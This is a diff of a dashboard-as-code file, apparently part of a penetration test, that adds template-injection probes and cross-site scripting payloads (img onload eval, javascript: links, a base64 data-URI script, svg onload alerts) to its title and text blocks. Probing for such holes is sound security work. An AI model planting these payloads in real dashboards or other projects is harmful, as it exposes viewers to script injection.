@@ -1,17 +1,20 @@
 Dashboard untitled_74 {
-  title: '''vcspentest{{7*7}}{7*'7'}{%7*7%}'"><h1>hello</h1>sssss'''
+  title: '''vcspentest{{7*7}}{7*'7'}{%7*7%}'"><h1>hello</h1>sssss<img onload=eval('alert(1)')>'''
   description: '''vcspentest{{7*7}}{7*'7'}{%7*7%}'"><h1>hello</h1>'''
-
   block title: TextBlock {
     content: @md # Your title goes here
-<font color="#D2D5DF">(Double click to edit)</font>;;
+<font color="#D2D5DF">(Double click to edit)</font>
+<img onload=eval('alert(1)')>;;
   }
   block guide: TextBlock {
     content: @md <div class="flex">
       <div class="flex-1 flex flex-col items-center">
         <div class="w-full">
         <h1>namdi</h1>
-          <h2>Tips</h2>
+          <h2>Tipssssss</h2>
+Hi, 'href=javascript:alert()>click me<a/y='
+...
+Nice seeing you, 'href=javascript:alert()>click me<a/y='
           <p>Add Visualization to make your dashboard more meaningful. <a href="https://docs.holistics.io/as-code/canvas-dashboard" target="_blank">Learn more</a></p>
         </div>
         <img src="https://go.holistics.io/canvas-floating-panel" width="50%" alt="Canvas Dashboard Main Panel">
@@ -25,7 +28,10 @@ Dashboard untitled_74 {
         <a href="https://go.holistics.io/sample-dashboard-2" target="_blank">
           <img alt="sample dashboard 2" src="https://go.holistics.io/sample-dashboard-2-thumb" width="65%" />
         </a>
-        vcs_pentest<iframe src="https://localhost:8080">
+        vcs_pentest<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
+<script>alert(domain);</script>
+
+<Svg OnLoad=alert(domain)>
       </div>
     </div>;;
   }
@@ -41,7 +47,6 @@ Dashboard untitled_74 {
       position: pos(20, 160, 1160, 660)
     }
   }
-
   theme: H.themes.classic
   settings {
     timezone: 'Etc/UTC'
